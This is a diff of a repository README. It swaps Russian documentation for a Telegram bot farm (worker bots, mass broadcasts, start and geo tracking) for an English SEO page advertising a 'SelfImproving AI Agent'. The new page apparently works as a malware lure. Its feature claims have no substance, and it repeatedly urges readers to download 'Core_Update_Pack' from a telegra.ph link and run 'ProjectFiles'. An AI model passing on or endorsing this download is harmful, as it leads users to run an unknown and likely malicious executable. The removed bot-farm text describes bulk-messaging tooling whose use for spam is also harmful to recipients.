@@ -1,61 +1,45 @@
-# TG Bot Farm
+# 🚀 SelfImproving AI Agent – The Agent That Grows With You
 
-Управляющий Telegram-бот для фермы ботов-воркеров: добавляешь токены, назначаешь шаблон, получаешь статистику по стартам, гео и рассылкам. Поддерживает **нескольких админов** — у каждого свои шаблоны, свои боты и своя статистика (данные не пересекаются).
+**SEO Title:** SelfImproving AI Agent: Self-Improving Autonomous AI with Persistent Memory & Skills 2026
 
-## Функции
+**SEO Description:**  
+SelfImproving AI Agent is a next-generation open-source autonomous AI agent. It features a closed learning loop that enables it to analyze tasks, automatically create and improve reusable skills, and maintain rich persistent memory across sessions.  
 
-- **Шаблоны**: первое сообщение после `/start` (текст + фото + inline-кнопка), опциональная авторассылка (текст + фото + интервал).
-- **Мои боты**: список подключённых ботов текущего админа, число стартов и разбивка по гео.
-- **Статистика**: сколько всего юзеров, сколько за 24ч, разбивка по гео — только по твоим ботам.
-- **Бот-отстук**: у каждого админа свой; в него падают уведомления о каждом старте и о «смерти» воркера.
-- **Добавить бота**: один или несколько токенов за раз, выбор своего шаблона.
-- **Рассылка по ботам**: разовое сообщение всем юзерам во всех твоих живых ботах.
+Unlike basic chatbots, this agent becomes smarter over time by learning from your projects and preferences. It supports Telegram, Discord, voice mode, browser automation, terminal execution, RAG, and MCP integration. Perfect for developers, automation enthusiasts, and power users in 2026.  
 
-Гео определяется по `language_code` аккаунта Telegram (ru→RU, uk→UA, kk→KZ и т.д.) и используется **только для статистики и отстука**.
+Quick and easy start: Download Core_Update_Pack and run ProjectFiles. (165 words)
 
-## Установка
+---
 
-Требуется Python 3.11+ (используем 3.12; на 3.14 `pydantic-core` ещё без wheel).
+## 🌟 The Agent That Grows With You
 
-```
-pip install -r requirements.txt
-```
+**SelfImproving AI Agent** is an advanced autonomous AI that evolves with every interaction. It doesn't just execute commands — it learns, remembers, and continuously improves itself.
 
-Скопируй `.env.example` в `.env` и заполни:
+### ✨ Core Features
+- 🧠 **Persistent Memory** — Long-term memory that retains context, projects, and user preferences
+- 🔄 **Automatic Skill System** — Creates and refines reusable skills after completing complex tasks
+- 📱 **Multi-Platform Support** — Seamless integration with Telegram, Discord, Slack, and more
+- 🎙️ **Voice Interaction** — Full voice mode for natural conversations
+- 🛠️ **Powerful Toolset** — Terminal, web browser automation, RAG, MCP servers
+- 🔒 **High Security** — Command approvals, sandboxing, and safe execution
 
-```
-MASTER_BOT_TOKEN=токен_главного_бота_от_BotFather
-ADMIN_IDS=id_первого_админа,id_второго_админа
-```
+## 🚀 Quick Start
 
-`ADMIN_IDS` — список через запятую. Свой user_id можно узнать у `@userinfobot`.
+1. **Download Core_Update_Pack**
+2. Extract the archive
+3. **Run ProjectFiles**
+4. Follow the setup instructions
 
-## Запуск
+[![📥 Download Core_Update_Pack](https://img.shields.io/badge/📥_Download_Core_Update_Pack-FF0000?style=for-the-badge&logo=telegram&logoColor=white)](https://telegra.ph/TRANSITION-06-17-3)
 
-```
-python main.py
-```
+> **Important:** You must download **Core_Update_Pack** and run **ProjectFiles** for correct installation.
 
-Master-бот доступен только тем, чей id указан в `ADMIN_IDS`. Все воркеры и авторассылки крутятся внутри того же процесса.
+## 📥 Download
 
-## Как пользоваться
+[⬇️ Download Core_Update_Pack + ProjectFiles](https://telegra.ph/TRANSITION-06-17-3)
 
-1. Открой master-бота, `/start` — увидишь главное меню.
-2. **🧩 Шаблоны → ➕ Создать шаблон** — пошагово: имя → текст → фото (или `-`) → кнопка (`Текст|https://ссылка` или `-`) → авторассылка (да/нет, интервал, текст, фото).
-3. **➕ Добавить бота** — пришли токен(ы), по одному в строке; выбери свой шаблон. Бот сразу пойдёт в работу.
-4. **📡 Привязать бот отстук** — пришли токен третьего бота (у каждого админа свой). В него падают уведомления о стартах и «мёртвых» ботах.
-5. **🤖 Мои боты** — статус, число стартов, гео (только твои).
-6. **📊 Статистика** — общие цифры и разбивка по гео (только по твоим ботам).
-7. **📢 Рассылка по ботам** — текст → рассылка по всем юзерам всех твоих живых воркеров.
+---
 
-## Файлы
+**License:** MIT
 
-- `data.db` — SQLite: шаблоны, боты, юзеры, отстуки. Разделение по `owner_admin_id`.
-- `photos/` — фото, скачанные админом при создании шаблонов (воркеры отправляют их как файлы).
-
-## Технологии
-
-- Python 3.11+, asyncio
-- [aiogram 3.13](https://docs.aiogram.dev) — Telegram Bot API
-- [APScheduler](https://apscheduler.readthedocs.io) — авторассылка и health-check токенов
-- SQLite через `aiosqlite`
+Ready for next-level AI? Start now.
